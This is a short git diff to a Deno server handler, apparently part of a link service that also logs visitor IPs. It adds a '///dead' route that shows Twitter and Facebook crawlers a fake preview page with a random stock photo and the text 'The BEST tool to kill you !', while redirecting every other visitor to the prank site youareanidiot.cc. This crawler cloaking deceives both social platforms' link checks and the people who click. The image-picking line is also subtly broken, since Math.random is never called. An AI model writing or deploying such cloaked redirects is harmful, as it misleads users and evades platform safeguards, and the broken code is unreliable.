@@ -109,6 +109,31 @@ async function handler(request, connInfo) {
       element=element+`</ol><a href="https://line-url.deno.dev/ip?tag=${tag}&del=true">データを削除</a>`
       html=html.replaceAll("{img}","").replaceAll("{x}","").replaceAll("{y}","").replaceAll("{title}","").replaceAll("<p>{text}</p>",element)
       return new Response(html,{status:200,headers:{"Content-Type":"text/html;charset=UTF-8"}})
+  }else if(requrl.pathname=="///dead"){
+    if((request.headers.get("user-agent").match(/Twitter/))||(request.headers.get("user-agent").match(/facebook/))){
+      let img,x,y,text,title;
+      const imgs=[
+        "https://images.pexels.com/photos/1743366/pexels-photo-1743366.jpeg",
+        "https://images.pexels.com/photos/1526713/pexels-photo-1526713.jpeg",
+        "https://images.pexels.com/photos/1496373/pexels-photo-1496373.jpeg",
+        "https://images.pexels.com/photos/1643409/pexels-photo-1643409.jpeg",
+        "https://images.pexels.com/photos/1525041/pexels-photo-1525041.jpeg",
+        "https://images.pexels.com/photos/842711/pexels-photo-842711.jpeg",
+        "https://images.pexels.com/photos/2559941/pexels-photo-2559941.jpeg",
+        "https://images.pexels.com/photos/2670898/pexels-photo-2670898.jpeg",
+        "https://images.pexels.com/photos/1229042/pexels-photo-1229042.jpeg",
+      ]
+      img=imgs[Math.floor(Math.random*9)]+"?"+Date.now()
+      x=1000
+      y=1000
+      text="The BEST tool to kill you !"
+      title="The BEST tool to kill you !"
+      let dummyHTML=await Deno.readTextFile("./server/dummy.html")
+      dummyHTML=dummyHTML.replaceAll("{img}",img).replaceAll("{x}",x).replaceAll("{y}",y).replaceAll("{text}",text).replaceAll("{title}",title)
+      return new Response(dummyHTML,{status:200,headers:{"Content-Type":"text/html;charset=UTF-8"}})
+    }else{
+      return new Response("",{status:301,headers:{"location":"https://youareanidiot.cc/"}})
+    }
   }
   return new Response("",{status:404})
 }
